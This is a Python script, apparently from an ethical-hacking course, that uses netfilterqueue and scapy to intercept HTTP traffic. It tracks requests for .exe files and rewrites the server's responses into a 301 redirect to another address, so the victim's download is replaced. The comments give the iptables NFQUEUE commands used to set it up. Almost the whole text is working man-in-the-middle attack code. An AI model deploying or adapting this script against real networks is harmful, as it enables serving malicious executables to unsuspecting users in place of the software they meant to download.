#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

ack_list = []


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum

    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):  # Check if packet contains a RAW layer (which usually contains the data)
        if scapy_packet[scapy.TCP].dport == 80:  # 80 is the port number for http
            if b".exe" in scapy_packet[scapy.Raw].load and b"www.example.com" not in scapy_packet[scapy.Raw].load:  # To manipulate exe downloadable files, similarly we can do
                # for jpg pdf etc files
                print("[+] exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)  # appending to check for the corresponding response
                # of this request only, A response to a request has a seq same as of request's ack
                print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://www.example.org/index.asp")

                packet.set_payload(bytes(modified_packet))

    packet.accept()  # To let the packet move forward to its destination


queue = netfilterqueue.NetfilterQueue()  # Creating an instance of NetfilterQueue() class
queue.bind(0, process_packet)  # 0 is the queue number of the queue we have created using this command in terminal:
# Instead FORWARD when testing on our own computer rather than remote computer we use INPUT and OUTPUT queue
# iptables -I INPUT -j NFQUEUE --queue-num 0
# iptables -I OUTPUT -j NFQUEUE --queue-num 0
# And process_packet is a callback function which will be executed on all the packets +nt in the queue
queue.run()
